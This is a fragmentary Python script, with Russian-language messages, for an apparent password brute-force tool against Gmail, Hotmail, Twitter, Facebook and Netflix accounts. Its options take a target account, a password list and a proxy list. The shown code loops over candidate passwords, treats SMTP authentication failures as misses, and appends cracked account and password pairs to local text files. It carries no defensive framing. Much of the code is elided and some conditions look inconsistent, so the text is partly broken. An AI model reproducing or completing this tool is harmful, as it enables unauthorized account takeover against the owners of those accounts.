...
{}
-----------------------------------------------------------------------
-g --gmail                              АККАУНТ  gmail @gmail.com
-t --hotmail                            АККАУНТ  hotmail @hotmail.com
-T --twitter                            АККАУНТ  twitter @
-f --facebook                           АККАУНТ  facebook @
-n --netflix                            АККАУНТ  Netflix @
-l --list                               Лист     Password BrutoForce
-p --password                           Готовые  Password
-X --proxy                              Прокси   list


							   """.format(G,R))

use.add_option("-g","--gmail",dest="gmail",help="Впишите аккаунт GMAIL")
use.add_option("-t","--hotmail",dest="hotmail",help="Впишите аккаунт hotmail")
use.add_option("-T","--twitter",dest="twitter",help="Впишите аккаунт twitter")
use.add_option("-f","--facebook",dest="facebook",help="Впишите аккаунт facebook")
use.add_option("-n","--netflix",dest="netflix",help="Впишите аккаунт Netflix")
use.add_option("-l","--list",dest="list_password",help="Впишите лист с паролями для перебора")
use.add_option("-p","--password",dest="password",help="Впишите пароль ")
use.add_option("-X","--proxy",dest="proxy",help="Прокси лист ")
...
def proxy():
    ...
    try:
        ...
        sys.exit('[!] Прокси не верные | ВЫХОД...')
    pl.random()
    ...
    if options.hotmail == None :
        ...
        if options.password != None or options.list_password == None  :
            ...
            try :
                ...
                print("Найден пароль :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
                Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+options.password+"\n")
            except :
                print("Не найдены пароли : {} \t Email Hotmail:{}".format(options.password,options.hotmail))
            ...
            for password in password_list:
                try :
                    ...
                    print("Не найдены пароли : {} \t Email Hotmail:{}".format(password,options.hotmail))
    if options.twitter != None :
    ...
    if options.password != None or options.list_password == None  :
        ...
        for password in password_list:
            ...
            try :
                ...
                print("{}<<<+++Найден пароль :{} \t Found Gmail:{}+++>>>".format(G,password,options.gmail))
                Save = io.open("Gmail.txt","a").write("Account Gmail:"+options.gmail+"\t\tPassword:"+password+"\n")
                break
            except smtplib.SMTPAuthenticationError:
                print("{}<<<---Не найдены пароли : {} \t Email Gmail:{}--->>>".format(R,password,options.gmail))
